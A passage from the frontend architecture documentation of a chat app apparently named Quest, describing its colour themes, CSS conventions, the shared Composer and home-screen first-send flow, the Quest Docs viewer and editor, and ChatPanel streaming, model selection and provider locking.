- `electric-blue` (Electric Capital brand ramp: cyan `#00bbf2` as the accent fill in both schemes -- light keeps the darker `#1c95c0` only for `--accent-text` and uses dark `--accent-contrast` text on the fill -- over greys `#161616`/`#2a2a2a` dark and `#f6f6f6`/white light) overrides them under `:root[data-color-theme="electric-blue"]` with its light values in a `prefers-color-scheme: light` block that the theme override plugin rewrites like any other.
- `alloy` (forest green + cream: forest-green grounds `#0b1914`/`#11251b`/`#193224` with cream type and a cream `#e2e5dd` accent fill in dark, cream grounds `#fffcec`/`#f6f3e1` with a forest-green `#326849` accent and warm charcoal text in light) and `recall` (sage mint on near-black: sage-mint `#8db5ac` accent with near-black type on it over a `#111111` ground and green-tinted `#1a1d1c`/`#242827` raised surfaces in dark, deepened sage `#4f7d72` on mint-tinted off-white `#f5f8f7`/white in light) follow the same shape.

The `index.html` boot script carries its own hardcoded list of known ids for the pre-paint attribute, so a new theme also touches it. Component stylesheets no longer hardcode the accent -- every former `#646cff` / `rgba(100, 108, 255, a)` / hover variant is a token reference -- so a new theme is one block in `themes.css` plus a `COLOR_THEMES` registry entry and a `COLOR_THEME_CHOICES` server allow-list entry (`chat/routes/user.py`); the three lists are hand-mirrored.

Tokenized too, so their tints follow the colour theme:

- Tool-call rows and cards (`ToolUseMessage.css`, `ToolCallGroup.css` -- collapsed rows, the expanded card/header, the input/output detail boxes and the sub-agent tree)
- the markdown link + code styling in model output (`Message.css`: links and inline `code` are `--accent-text`, fenced blocks sit on a faint `rgb(var(--accent-rgb) / a)` wash with `--text` as the base colour; the FileViewerModal `.md` preview mirrors the same link/code tokens)

Their light-mode blocks keep only the semantic status colours (green/amber/red) and the syntax-highlighting palette. The action-request cards are the remaining hardcoded-indigo surface.

#### 1. Component-Level CSS Files
Each component has its own CSS file:
- `Sidebar.tsx` → `Sidebar.css`
- `App.tsx` → `App.css`

Benefits:
- Colocation of styles with components
- Easy to find and modify styles
- Clear ownership of CSS rules

#### 2. BEM-Like Class Naming
Class names follow a hierarchical pattern:
```css
.sidebar                    /* Block */
.sidebar-header            /* Block-element */
.sidebar-loading           /* Block-element */
.conversation-list         /* Block */
.conversation-item         /* Block-element */
.conversation-item.active  /* Block-element-modifier */
.conversation-title        /* Block-element */
.conversation-meta         /* Block-element */
```

#### 3. State Classes
State modifiers as additional classes:
```tsx
className={`conversation-item ${activeConversationId === id ? 'active' : ''}`}
```

#### 4. CSS Custom Properties

The `:root` block in `frontend/src/index.css` defines shared CSS variables:
- `--font-mono`: Unified monospace font stack headed by JetBrains Mono (loaded via Google Fonts in `frontend/index.html`), followed by SF Mono, Fira Code, Cascadia Code, Consolas, and Monaco. All components reference this single variable instead of declaring their own font stacks.

Standard colors are otherwise specified as direct hex/rgba values (e.g., `#646cff` for the primary accent).

#### 5. Responsive Design
Currently uses `@media (prefers-color-scheme: light)` for theme support. Responsive breakpoints not yet implemented since this is a desktop-first application.

## Composer Component

`frontend/src/components/Composer.tsx` is the single shared message-composer footer, reused by both the live chat view (`ChatPanel`) and the root home screen (`HomeComposer`). It was extracted out of `ChatPanel` so there is one composer codebase.

It owns all composer-local state and handlers: the auto-resizing textarea, Enter-to-send (with IME guard), clipboard image paste / attachment queue + two-phase upload, the generic file-attach ("Attach") button + queued-file chips, the model selector, the "+ Skill" button + `SkillSelectorModal`, the Flags popover / read-only flags label, and the `ContextIndicator`.

It reads per-conversation model / skills / flags from `useConversationModels()` / `useConversationSkills()` keyed by the passed `conversationId`, and does NOT call `useConversation` itself, so it can render before a conversation exists (the home screen passes an in-memory draft key as the `conversationId`).

The host decides send behavior and gating via props (see `ComposerProps` in the file):

- `onSend` (ChatPanel passes its live `sendMessage`; HomeComposer passes a deferred-create flow; the callback's trailing `files?: File[]` param carries the queued generic attachments back to the host -- see below)
- `onStop`, `isFirstMessage`, `isStreaming` / `isReadOnly` / `hasPendingWait`, the `ContextIndicator` token props, the Slack read-only props
- `onModelChange` (a draft-safe setter override; HomeComposer passes `setDraftModelForConversation` so model changes don't PATCH a nonexistent conversation)
- `skipSendLocks` (when true, the send path skips writing the first-send provider lock for `conversationId`; HomeComposer passes it because its `conversationId` is the in-memory draft key -- locking that key would permanently poison the persisted lock map, since entries are never removed -- and the lock is instead written on the real conversation id by `ChatPanel`'s `pendingFirstMessage` auto-send effect. Defaults to false: ChatPanel's per-conversation composer keeps locking on send)

Styling reuses `ChatPanel.css` (`.input-area.composer`, `.composer-bubble`, `.composer-controls`, etc.) -- there is no forked composer CSS.

**Layout (one floating bubble on every viewport):** the composer renders a single rounded raised bubble on the chat ground (matching the floating right-side workspace cards), never a full-width bordered footer: the auto-growing textarea on top and an icon-only controls row underneath:

- attach (paperclip)
- skills (sparkles)
- flags (flag; first message only)
- the borderless pill-shaped model trigger
- the read-only "N flags enabled" label / no-credentials warning
- then the `ContextIndicator` (a fixed-size circular context meter, see overview.md) and a round arrow Send (or square Stop) button pushed to the right.

No text labels; every icon button carries a `title` tooltip.

**Overflow rule:** the model pill (`.model-menu-container` / `.model-menu-trigger`, `flex: 0 1 auto; min-width: 0`) is the ONLY shrinkable item in the row; every icon button, the mic timer, the no-credentials warning, the context ring and the Send button are `flex-shrink: 0`. When the row runs out of room (phone widths, long self-hosted model names, mic + flags buttons present) the model name ellipsizes down to just its chevron and the Send button never leaves the bubble. Read-only conversations show the disabled model trigger + context gauge in the row and no send button. On desktop the bubble sits in the flex column below the messages, centered and capped at the 720px messages-list width, and the controls row is ALWAYS visible.

On phone widths (`useIsMobile`, the same 768px breakpoint as `MobileShell`):

- the bubble overlays the bottom of the messages area (absolute inside `.chat-panel`, with matching `messages-list` bottom padding + `scroll-padding-bottom`)
- collapses to a single input pill until focus is inside the composer or any draft state exists (text, attachments, queued skills/flags)
- Enter inserts a newline instead of sending
- nothing auto-focuses (that would pop the software keyboard)
- the controls row swallows `mousedown` so a tap on a control does not blur-collapse the row mid-tap
- the flags popover re-anchors to the bubble as a full-width sheet
- the model menu is a full-screen sheet instead of a popover (see Model Selector below); while it is open the bubble stays expanded (`isModelMenuOpen`, fed by the selector's `onOpenChange`) even though the sheet takes focus out of the composer

All phone-only rules live behind one `@media (max-width: 768px)` block at the end of `ChatPanel.css`; the home screen just zeroes the strip padding around the bubble (`HomeComposer.css`) since the bubble is its own card.

**Generic file attachments (distinct from clipboard-image paste):** a paperclip attach icon button sits in the bubble's `.composer-controls` row next to the skills / flags icon buttons. It opens a file picker and queues arbitrary files (any extension) into a chips row (per-extension icon, filename, human-readable size via `formatBytes`, remove button).

Caps are client-side: `MAX_ATTACH_FILE_SIZE = 200 MB` per file (matching the backend `MAX_FILE_SIZE`) and `MAX_PENDING_FILES = 20`, both surfaced as inline notices when exceeded. Send stays gated on non-empty trimmed text -- queued files alone do NOT enable send.

On send the composer forwards the raw `File[]` to the host via `onSend`'s trailing `files?` param; the host (not the composer) owns the upload, because the home screen has no workspace until it creates the conversation.

This is separate from the clipboard PNG/JPEG paste path, which two-phase-uploads to `POST /conversations/{id}/composer-attachments` and rides on `WebSocketSendMessage.attachments`; the generic path reuses the existing workspace `POST /files/upload` route and threads filenames as `attached_filenames` (see [Realtime -- Send Message](realtime.md#subscription-protocol) and [Gemini API -- Message Metadata Wrapping](gemini-api.md#message-metadata-wrapping)).

The per-feature composer behaviors described below under ChatPanel (clipboard paste-to-attach, the Flags button, the model selector / provider locking, the `ContextIndicator`, Slack read-only mode) now live in `Composer.tsx`; ChatPanel renders `<Composer>` and passes its live state.

## Home Screen (HomeComposer)

`frontend/src/components/HomeComposer.tsx` (+ `HomeComposer.css`) is the root empty-state screen rendered at `/` when no conversation is selected (replacing the former "Select a conversation or start a new chat" placeholder; wired in `frontend/src/App.tsx`).

It renders a large greeting above a centered, pre-focused shared `<Composer>`, with a branding footer pinned to the bottom of the screen (two centered muted lines: `Remember AI can make mistakes, but <appName> keeps you in control.` and `Made with <heart> by Electric Capital`).

The heart is the monochrome `currentColor` `HeartBoltMorph` SVG from `frontend/src/components/HeartBoltMorph.tsx` -- one closed path of eight cubic segments SMIL-animated between a heart and the Electric lightning bolt:

- tall ~1:2.7 mark with vertical inner step edges spanning the 24-unit box; the heart is drawn smaller inside the same box, and the box is rendered taller than the line and centred on the text with negative vertical margins
- on a 14s loop (5s heart hold, 2s ease-in-out morph, 5s bolt hold, 2s morph back; SMIL rather than the CSS `d` property because Safari lacks the latter)
- static heart under `prefers-reduced-motion`

The same glyph replaces the former pink ♥ in Settings > About so both credits are monochrome.

The greeting is `What can I help you with, <first name>?` using the first token of `userName`, falling back to `What can I help you with?` when the name is missing/blank.

Every "New Chat" entry point (Sidebar brand bar, both Conversations header `+` buttons, the phone top bar) lands here instead of pre-creating an empty conversation: the conversation only comes into existence as a response to the first message (see First-send flow below); entry points clicked while drilled into a project keep the drill so the chat lands in that project.

**Project awareness:** the home composer can be on screen while the Sidebar is drilled into a project -- most commonly right after creating a new (empty) project, which drills in without changing the URL from `/`. In that state the first send creates the conversation INSIDE the drilled project (`createProjectConversation(drilledProjectId)`) and navigates to `/projects/<pid>/<id>`, instead of a standalone chat. The drill state is read from the context field `drilledProjectId` (owned by the Sidebar; distinct from `activeProjectId`, which mirrors the URL and is null at `/`), and a `New chat in <project name>` hint under the greeting names the destination.

There is no live conversation yet, so the composer is bound to a stable in-memory draft key (`HOME_DRAFT_KEY = '__home_draft__'` in `frontend/src/constants/drafts.ts`) used only for the context-keyed model/skills lookups, and its `onModelChange` is wired to `setDraftModelForConversation` (in-memory map + `defaultModel`/localStorage only, no server PATCH). HomeComposer also passes the composer's `skipSendLocks` prop so the send path never writes a provider lock for the draft key -- see Provider Locking under the Model Selector section for why locking the draft key is destructive and how legacy entries are healed.

**First-send flow** (`handleSend` in `HomeComposer.tsx`): on submit it:

- creates the conversation via `createConversation()` (or `createProjectConversation(drilledProjectId)` when the Sidebar is drilled into a project -- see Project awareness above)
- seeds the store via the shared `seedNewConversation()` util (`frontend/src/utils/newConversation.ts`, also used by the Sidebar duplicate-workspace and routine-run paths)
- re-keys the home-chosen queued skills onto the new conversation id
- stashes the typed prompt + chosen model/skills/flags in the new `pendingFirstMessage` context field
- navigates via the same `handleNewConversation` callback as the Sidebar

`ChatPanel`'s auto-send effect (gated on `isLoaded && !isStreaming && messages.length === 0`) then clears the field, performs the real first send carrying the model/skills/flags (and the attached filenames -- see below), and locks the provider -- mirroring the existing `pendingRoutineMessage` auto-send pattern. This effect is the sole lock point for home-originated conversations, since the home composer sends with `skipSendLocks`.

`pendingFirstMessage` (shape `{ conversationId, prompt, model, skillIds, flags, attachedFilenames }`) is defined on `NavigationContext` (see Application Contexts section).

**Generic file upload on first send:** when the home composer's `onSend` carries queued `files`, `handleSend` uploads them via `uploadFiles(newId, files, '')` (the existing workspace `POST /files/upload` route -- no new endpoint) AFTER `createConversation()` resolves (so the workspace exists) and BEFORE navigation / the first send.

The uploaded filenames are stashed onto `pendingFirstMessage.attachedFilenames` so the auto-send forwards them as `attached_filenames`. A hard upload failure surfaces an error and aborts the send; a partial-error response proceeds with a notice.

This is the only way to attach files alongside the first message on the home screen, which has no file-browser panel. `ChatPanel.handleComposerSend` (live chat, where the workspace already exists) uploads immediately then sends in one step. See [Gemini API -- Message Metadata Wrapping](gemini-api.md#message-metadata-wrapping) for how the model is told about the just-attached files.

## Quest Docs UI

The Quest Docs UI (browse, create, rename, download, delete; sharing, human editing and History); the authoritative description (files, flows, design decisions) is [Quest Docs -- Frontend](quest-docs.md#frontend).

**Routes.** `/docs` (All Docs), `/docs?project=<id>` (filtered to one project) and `/docs/<id>` (viewer) are URL-only state like `/inbox`: `parseDocsRoute()` in `frontend/src/utils/docsRoute.ts` is read on every render by `App.tsx` and the Sidebar, with no `NavigationContext` field. A docs route is a full main-pane takeover like `RequestsView` (`.main-content.docs-main`, no RightPanel, `activeConversationId` null). `showRequestsView` still wins the render, so the Sidebar clears it before navigating. While the `docs` gate is closed (`enabled_features` on GET /me, `DOCS_FEATURE`), a docs URL renders `DocsGateClosed`.

**Sidebar.** `DocsSection` (`components/sidebar/DocsSection.tsx`) renders the user's five latest own user docs (docs shared with them appear only in All Docs) between Projects and Conversations, with a header button that opens `/docs`. `ProjectPanel` renders the drilled project's docs below Routines (Routines, Docs, Conversations), with a header that opens `/docs?project=<id>`. Both are fed by Sidebar-owned `useDocs` instances and hidden while the gate is closed. The Sidebar's `onNavigateAway` prop lets `MobileShell` close the phone drawer after a doc or All Docs click.

**All Docs.** `components/docs/DocsListView.tsx` takes over the main pane: "Your docs" from `useDocs({limit: 50})` (own user docs), "Shared with you" from `useDocs({shared: true, limit: 50})` (docs other people shared, user and project docs, its own keyset stream and Load more, hidden while empty, scope cell "Shared by <owner>"), plus one group per project, archived ones included, from `hooks/useProjectDocsIndex.ts` (one `fetchDocs` per project, because the backend has no cross-project list of the user's own projects; `doc_list_changed` refreshes behind a 600 ms debounce, `useDocs` behind 300 ms). It adds client-side search (shared rows also match their owner's name / email), grouping via `utils/allDocsGrouping.ts`, and `NewDocModal` (title, description, location; no mode picker and never a `mode` in the request, since a user doc is always private and a project doc takes its project's mode; a read-only "inherited from the project" line only for a public project).

**Viewer.** `components/docs/DocViewer.tsx` (`hooks/useDoc.ts`) renders the body with the chat's shared `markdownComponents` under `MarkdownWorkspaceContext.assetBase` (see Message Component above), with a Show source toggle and a "Last written by ... / Updated ..." footer (from `last_write_source` + `last_write_user`: "you", a person's name, "<name> (approved change)" or "a deleted user (approved change)", an action request or a linked conversation; image uploads and deletes keep the body's writer). `useDoc` re-fetches only on `doc_changed` for its own doc (a null `updated_at` = deleted or access changed, always re-fetch) and ignores the install-wide `doc_list_changed`, which only the lists consume. `DocHeader.tsx` is modeled on `ConversationHeader.tsx`: a title + chevron dropdown with R / E / H / S / D key hints, offering Rename (inline, `expected_updated_at`, 409 `stale_update` reloads the row), Edit and History (`can_edit`, view mode only), Share (`can_share`), the md / zip downloads and Delete (confirmed in `components/docs/DocConfirmDialog.tsx`, the shared confirm: named by its title through ModalShell's optional `ariaLabelledBy` prop, Cancel focused on open, focus back to the opener on close), each gated by the row's `access` flags; beside the title, a share chip (the owner's "Shared with N people / everyone", opening Share; a recipient's "Shared by X · Can edit / Can view", from `utils/docSharing.ts`) and a project chip that is plain text for a project the viewer does not own. The viewer body has three modes kept per doc id (`view`, `edit` = `DocEditor.tsx`, `history` = `DocHistory.tsx`; root class `doc-viewer--<mode>`); save and restore responses merge through `useDoc.applyContent()`, and `useDoc.applyRow()` re-fetches whenever a row's `updated_at` is newer than the shown one. `DocShareDialog.tsx` (owner only, over any mode): a debounced `/users/search` typeahead with a Can view / Can edit select (text without "@" resolves only from a single matching suggestion), an "Everyone on this install" select whose new grant or view -> edit widening goes through a confirm, the roster with per-person permission and remove, notes from `shareDialogNotes()`, the add row resetting to "Can view" after each grant, and no closing while a request is in flight. `DocEditor.tsx` (owner or write share): textarea + live preview (250 ms debounce, manual "Refresh preview" above ~200 KB; hidden-preview choice in localStorage `quest_doc_editor_preview`), Ctrl/Cmd+S scoped to the editor, image upload by button / paste / drop (5 MB client-side pre-check, an upload placeholder at the caret), a 409 that re-reads the doc and silently re-saves once when only metadata moved (the server body still equals the body the token belongs to), unless an image the draft added was deleted meanwhile (then a notice and no save), else a conflict banner (overwrite or discard), one confirm on every discard path, and an unsaved-changes guard (`hooks/useUnsavedChangesGuard.ts`: `beforeunload` plus capture-phase interception of same-origin `<a href>` clicks). Back / forward and button `navigate()` cannot be intercepted under the plain `BrowserRouter`, so the draft is also backed up per user in localStorage (`utils/docDraftBackup.ts`, key `quest_doc_draft:<encoded lower-cased email>:<docId>` because `GET /me` exposes no user id; pruned after 30 days; cleared on logout, logout-and-disconnect and account delete by `components/settings/SignOutSection.tsx`). The viewer offers "You have unsaved changes from <time>. Resume editing" in view mode, the editor offers the restore on open, and when the doc 404s (deleted, share revoked) or the viewer lost edit access, `DocDraftRecovery.tsx` shows the draft read-only with Copy / Download .md / Discard. `DocHistory.tsx` (owner or write share): version list + rendered version, bounded diff to the current body, Restore (with the token as of the confirm) and Copy to a new private doc. There is no mode switch for any doc (user docs are always private, project docs keep their project's mode; the header ignores `access.can_switch_mode`, which is always false). `DocModeBadge` (`components/docs/DocModeBadge.tsx`, the Private lock / Public globe pill) appears only on public docs, on sidebar rows, All Docs rows (the "Mode" column label only while a visible row is public) and the viewer header (`utils/docMode.ts` `shouldShowDocModeBadge(mode)` = `mode === 'public'`). `DocAssetsPanel.tsx` lists the detail's `assets` (`[{name, size, mime}]`) as a `.right-panel-card` in a 280px right gutter beside the doc column (thumbnails from the doc asset route, click -> `DocImageLightbox.tsx` on ModalShell with a Download link, empty state; the owner gets a per-image delete in view mode, confirmed, with 409 `asset_in_use` shown in the dialog); it drops under the body at <=1024px and becomes a collapsed `<details>` section on phones.

**write_doc card.** `ActionRequestPreviewFields` renders the `doc_image` preview field with `DocImagePreview.tsx` (a workspace thumbnail via the card conversation's `files/download` route, click opens `FileViewerModal`). `SkillContentDiffPreview.tsx` renders a bounded `skill_content_diff` window, recognized by `total_old_lines` / `total_new_lines`, with "lines above / below not shown" edge separators, a "Show context lines" toggle and a truncation note. Whole-body skill and routine diffs are unchanged.

**Phone.** `MobileShell` receives `docsRoute` / `docsEnabled` from `App.tsx` and renders the same views (or `DocsGateClosed`) in `.mobile-main`. It closes both drawers when the docs route changes and hides the workspace button on docs routes.

## ChatPanel Component

The ChatPanel is the main chat interface for displaying and sending messages in a conversation.

### Implemented Components

#### 1. ChatPanel Component (`src/components/ChatPanel.tsx`)

The main chat interface that handles message display, real-time streaming, and the shared `<Composer>` footer. Wrapped with `React.memo` so it only re-renders when its props change (primarily `conversationId`).

**Props Interface**:
```typescript
interface ChatPanelProps {
  conversationId: string;              // ID of the conversation to display
  onConversationUpdate?: () => void;   // Callback to refresh sidebar after messages
}
```

**Features**:
- Conversation title unit at the top of the panel (`src/components/ConversationHeader.tsx`, styled after the Claude.ai chat header): the title (`customName` from `useConversation`, else the first-user-message slice) followed by a chevron; clicking opens a dropdown with Rename (inline input replacing the title; Enter/blur submits, Escape cancels, empty reverts to the auto title) and Archive/Unarchive (an "Archived" pill shows on the title while archived).
  - Each item shows a single-letter hint (R / A) that also works as a shortcut while the menu is open. There is deliberately no Delete -- conversations are only ever archived.
  - Title/archived state is hydrated from `GET /conversations/{id}` (`custom_name`, `archived`, `title`) into `useConversation` and updated optimistically; the sidebar re-syncs through the server-published `conversation_list_changed` event, so the header has no sidebar wiring.
  - When the model names the chat via the `set_conversation_name` tool, the loop emits a `conversation_updated` event with the new `custom_name`; `useConversation` subscribes to it (through `webSocketManager.onConversationRenamed`, the same callback the sidebar uses) so the header title updates live alongside the sidebar row
- Automatic conversation history loading via `useConversation` hook
- Real-time message streaming via the singleton `persistentWebSocket` (with `WebSocketManager` as a thin shim)
- Message display with user/assistant role differentiation
- Timestamp formatting (today shows time only, older shows date + time)
- Optimistic UI updates (user messages appear immediately)
- Smart auto-scroll behavior that respects user scroll position
- Typing indicator with animated dots during streaming
- Auto-resizing textarea (grows up to 200px height)
- Enter to send (with IME composition guard), Shift+Enter for newline
- Clipboard paste-to-attach for PNG/JPEG images: the `handlePaste` handler in `frontend/src/components/ChatPanel.tsx` filters `event.clipboardData.items` by MIME, queues each as a `PastedImage` with an `URL.createObjectURL` preview, caps the queue at `MAX_COMPOSER_ATTACHMENTS = 10`, and renders a row of removable thumbnails between the textarea and the action row.
  - Send is a two-phase op: `uploadComposerAttachments()` in `frontend/src/api/fileApi.ts` POSTs the bytes to `POST /conversations/{id}/composer-attachments` (see [Chat API -- Composer Attachments](../api/chat-api.md#composer-attachments)); on success the returned `ComposerAttachmentRef[]` rides on `WebSocketSendMessage.attachments`. Upload errors leave the queued thumbnails intact and re-surface the typed text so the user can retry without re-pasting.
  - The transcript renders persisted attachments under the user bubble via `Message.tsx`'s `message-attachments` block; clicking a thumbnail opens the existing `FileViewerModal`. See [Realtime -- Message Attachments](realtime.md#message-attachments) for the end-to-end (validation, provider multimodal hand-off, and the `attachments_unsupported_during_resume` rejection)
- Auto-focus input after streaming ends
- Model selector menu for choosing LLM model (Gemini Pro, Gemini Flash-Lite, Gemini Flash, Claude Haiku, Claude Sonnet, Claude Opus); filtered to same-provider models after first message (see Provider Locking)
- "+ Skill" button next to the model selector for loading skills into the current conversation; opens the `SkillSelectorModal` (see [Skill Library Architecture](skill-library.md) for the full conversation skill loader feature)
- Flags icon button next to the skills icon button in the composer controls row, shown only on a fresh conversation (`messages.length === 0`); opens a checkbox popover of per-conversation opt-in behaviors (`AVAILABLE_FLAGS` in `frontend/src/constants/flags.ts`). Selected flags ride out-of-band on the first `send_message` payload. After the first message it becomes a read-only "N flag(s) enabled" label. See [Conversation Flags -- Composer UI](conversation-flags.md#composer-ui-out-of-band-selection)
- Context usage indicator in the composer controls row via `ContextIndicator` component (percentage badge with color-coded thresholds, hover tooltip showing raw token counts, and info icon that opens `SystemPromptModal` to view the full system prompt)
- `data-message-index` attributes on message elements for scroll targeting from search results
- Scroll-to-message with highlight animation: when `scrollToMessageIndex` is set in `NavigationContext`, ChatPanel scrolls to the target message and applies a brief highlight animation, then clears the index
- Read-only mode for Slack-driven conversations: when `useConversation` reports `origin === 'slack'` (populated from `GET /conversations/{id}`, see `frontend/src/api/types.ts`), the composer input is disabled, the Send/Stop button and the attach/skills/flags controls are hidden (the model trigger stays, disabled, showing the conversation's model), and the textarea placeholder explains that the user is driving the conversation via Slack. The `ContextIndicator` (and its system-prompt viewer) remain visible. See [Slack Socket Mode](slack-socket-mode.md) for why these conversations are one-sided in the web UI
- Loading state ("Loading conversation...")
- Error state with user-friendly error messages
- Empty state ("Start a conversation by sending a message below")
- Stream error display with inline error bubbles

**State Management**:

The ChatPanel uses the `useConversation` hook for all conversation state, with only UI-local state managed via useState:

```typescript
// From useConversation hook - per-conversation state from global store
const {
  messages,           // Loaded messages from API
  isStreaming,        // Whether currently streaming
  partialResponse,    // Accumulated text during streaming
  streamingMessages,  // Structured messages during streaming
  error,              // Error message (if any)
  isLoaded,           // Whether conversation loaded
  isLoading,          // Whether currently loading
  sendMessage,        // Function to send a message
} = useConversation(conversationId);

// Local UI state
const [inputValue, setInputValue] = useState('');               // Current input text
const [wasNearBottom, setWasNearBottom] = useState(true);       // Auto-scroll tracking
```

This separation ensures per-conversation state persists when switching conversations (see State Management Architecture section).

**Auto-Scroll Logic**:
The component implements smart auto-scroll that:
- Scrolls to bottom when conversation loads (instant)
- Scrolls to bottom when user sends a message (smooth)
- Auto-scrolls during streaming ONLY if user was already near bottom
- Re-anchors to bottom when post-stream tail-fetches grow the messages array (length-keyed effect), so settled DOM still ends up at the bottom
- Force-scrolls to bottom on the streaming-to-finalized transition (`partialResponse` non-empty -> empty) regardless of the near-bottom heuristic, since the user was clearly tracking the stream and the heuristic can go stale-false during smooth-scroll animation
- Doesn't interrupt user if they scroll up to read history
- Uses 100px threshold to determine "near bottom"
- `.messages-list` carries a 3rem `padding-bottom` (in `ChatPanel.css`) so the scroll-to-bottom anchor leaves ~3 lines of slack below the last message

**Timestamp Formatting**:
Handled by `formatTimestamp()` in `frontend/src/utils/formatters.ts`. Shows time only for today ("2:30 PM"), date + time for older messages ("Jan 30, 2:30 PM").

**Message Flow**:
1. User types message in auto-resizing textarea
2. Presses Enter (or clicks Send)
3. `sendMessage()` from `useConversation` hook is called
4. User message added optimistically (`optimistic: true`) to `conversationStore`
5. `WebSocketManager.sendMessage()` forwards to `persistentWebSocket.send({op:"send_message", ...})` on the singleton WS
6. Server appends the user message and runs the model. Each `message_appended` envelope triggers a `fetchConversationTail` in the hook, which feeds the rows into the store via `insertMessagesBySeq` (seq-ordered, dedupe-safe) and reconciles the optimistic bubble in place; transient `text_delta` / `sub_agent_*` envelopes update `partialResponse` / `streamingMessages` via the manager
7. Component re-renders as `partialResponse` and `streamingMessages` update
8. On a `message_appended` boundary that ends an assistant text bubble, `WebSocketManager` calls `finalizeStreamingTextInPlace` so the streaming bubble swaps to a synthetic persisted entry in one render; the tail-fetch then replaces the synthetic in place at the same seq
9. The server sends `send_message_finished` when the run truly ends; `WebSocketManager.notifyStreamComplete` fires
10. Sidebar refreshes via the `conversation_list_changed` global event (or via `onStreamComplete` for fallback consumers)

See `frontend/src/App.tsx` for usage of `ChatPanel` within the app layout.

#### 2. ChatPanel Styling (`src/components/ChatPanel.css`)

Comprehensive CSS with dark/light mode support and animations:

**Layout**:
- Full viewport height (100vh) flex container
- Messages container with custom scrollbar (inset from the panel edge via a transparent right border), 2rem side gutters on desktop (1rem on phones)
- Fixed input area at bottom
- Max-width: 720px for messages (centered); the composer bubble shares the cap so both line up

**Message Bubbles**:
- **User messages**: Right-aligned, blue background (#646cff)
- **Quest messages**: Left-aligned, gray background (#2a2a2a)
- 80% max-width for readability
- Rounded corners (12px border-radius)
- Fade-in animation on appearance
- No role header ("You" / "Quest"): the timestamp, plus the model display name for assistant replies, lives in a `.message-footer` absolutely positioned into the list gap under the bubble and revealed only on hover (`@media (hover: hover)`); inline `code` renders bold in the theme's `--accent-text` with no background, fenced blocks keep an accent-washed one; collapsed tool-call rows are deliberately low-contrast (opacity 0.55, raised on hover)

**Message Headers**:
- Role label ("You" vs "Quest"); hovering the "Quest" label shows a tooltip with the specific model display name (e.g., "Gemini 2.5 Pro", "Claude Sonnet 4"). Model ID resolved via `getModelDisplayName()` from `frontend/src/constants/models.ts`
- Timestamp display
- Small font size (0.75rem)
- Reduced opacity for less prominence

**Streaming Indicators**:
- Typing indicator with three animated dots
- Pulse animation on streaming message content
- Smooth opacity transitions

**Input Area**:
- Auto-resizing textarea (min: 44px, max: 200px)
- Custom scrollbar for long inputs
- Send button with disabled states
- Focus highlight with primary color (#646cff)
- Disabled state during streaming
- Model selector menu below textarea

**Model Selector**:
- Two-level menu (`frontend/src/components/ModelSelector.tsx`) positioned below the message input: a trigger button showing the current model's display name opens an upward popover (Flags-popover interaction pattern: outside-click and Escape close)
- Top level shows the admin's slotted picks from `getTopLevelModels()` in `frontend/src/constants/models.ts` (Settings > Model Selection, see [Model Selection](model-selection.md); the server defaults are "Smart ($$$)" Claude Opus 4.8, "Faster ($$)" Claude Sonnet 5, "Fastest ($)" Gemini 3.8 Flash) -- each shown as its descriptor sublabeled with its concrete model name, or the bare name when the descriptor is empty -- plus an "All models" row whose flyout submenu (hover or click to open) lists the full selectable model list (already filtered by the conversation's private/public visibility via `getSelectableModels(visibility)`), scrolling with the current selection auto-scrolled into view
- The model list is a **runtime catalog** (`frontend/src/constants/models.ts`): `GET /app/api/config` returns `models` (every known model -- the fixed Vertex registry plus each admin-configured OpenRouter instance's models under their `<instance>:<wire_id>` ids, incl. deprecated / admin-disabled ones so old conversations still label correctly -- with `display_name`, `provider`, `provider_label`, `max_input_tokens`, `deprecated`), and `AppConfigContext` feeds it to `setModelCatalog()` before applying `available_models`. A hand-mirrored Vertex-only list is the pre-fetch fallback. Instance models get their instance label folded into the display name ("DeepSeek V4 Flash (OpenRouter)") so two instances of the same model are distinguishable. Lookups go through `getKnownModels()` / `getModelInfo()` / `getModelDisplayName()` / `getProviderForModel()` / `isDeprecatedModel()`; pickers use `getSelectableModels()` (deprecated entries excluded)
- The host (`Composer.tsx`) passes the selectable list already narrowed to `getSelectableModels()`, credentialed models, and the conversation's provider lock; recommended picks not in that list are hidden (a Gemini-only local instance shows no recommended rows, just "All models"). A current selection that isn't offered stays visible suffixed "(deprecated)" or "(no credentials)" so a conversation already on it keeps it and the user can switch away. The Slack read-only case renders the trigger disabled with a "Server default" label when the conversation has no explicit model
- **Phone widths** (`useIsMobile`): the popover is replaced by a full-screen sheet (`.model-sheet` in `ChatPanel.css`) -- a "Model" header with a close button over one scrolling list: the top-level picks, then every selectable model under an "All models" heading, no drill-in. A popover anchored above the composer cannot fit a long model list in the strip left above the on-screen keyboard (its top rows were unreachable), so the sheet:
  - is portaled into `.mobile-shell`, which `MobileShell` keeps sized to the visual viewport, so `position: absolute; inset: 0` covers exactly the visible area above the top bar and drawers
  - moves focus from the composer textarea into itself on open, which dismisses the keyboard and gives the list the whole screen, and returns focus synchronously inside the closing tap (pick, close button, Escape) -- iOS only raises the keyboard for a `focus()` made during a user gesture; nothing is refocused when the textarea was not focused at open
  - stops its own focus/blur events from bubbling (React bubbles portal events to React parents) so the composer's focus-within tracking is not confused
  - scrolls a selection that only appears under "All models" into view once per open
- `getProviderForModel()` helper in `frontend/src/constants/models.ts` maps model IDs to provider names
- Per-conversation persistence on the server (`conversations.model` column); the frontend hydrates the model selector from the `model` field in the conversation metadata and PATCHes changes back via `PATCH /conversations/{conversation_id}/model`
- Changing model in any chat updates the default for new conversations
- Selected model passed in the `send_message` payload on the persistent WS

**Provider Locking**:
After the first message in a conversation, the provider (Gemini or Anthropic) is locked. The model dropdown filters to only show models from the locked provider, preventing cross-provider switching mid-conversation. Provider locking is managed in `ConversationModelsContext.tsx` (`lockedProviders` state, persisted in localStorage under `quest_locked_providers`).

Locking is triggered in four scenarios: on first message send in the shared composer (`handleSend` in `frontend/src/components/Composer.tsx`, skipped when the host sets `skipSendLocks`), and in `ChatPanel.tsx` when loading an existing conversation that already has messages, during routine auto-send, and in the `pendingFirstMessage` auto-send effect for home-originated conversations.

The `getLockedProvider()` function returns the locked provider name (or `null`), and the dropdown uses it to filter the model catalog by matching `provider` tag (every OpenRouter instance shares the `openrouter` provider, so switching between instances mid-conversation stays allowed -- their histories share one format).

The home composer must never write a lock: it is keyed by the stable draft key `HOME_DRAFT_KEY` (`frontend/src/constants/drafts.ts`), lock entries are never removed, and both lock maps are persisted -- so a lock on the draft key would filter the home model dropdown to one provider forever.

